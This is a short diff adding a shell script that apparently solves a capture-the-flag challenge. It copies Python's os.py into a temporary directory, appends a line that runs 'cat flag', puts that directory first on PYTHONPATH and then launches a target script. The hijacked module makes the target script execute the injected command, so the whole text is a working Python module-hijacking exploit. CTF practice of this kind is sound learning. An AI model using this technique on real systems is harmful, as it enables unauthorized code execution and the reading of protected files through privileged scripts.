@@ -1,0 +1,5 @@
+mkdir /tmp/XqTKwAB2tA
+cat /usr/lib/python3.6/os.py > /tmp/XqTKwAB2tA/os.py
+echo 'system("cat flag")' >> /tmp/XqTKwAB2tA/os.py
+export PYTHONPATH=/tmp/XqTKwAB2tA:$PYTHONPATH
+./run-very-secure-script
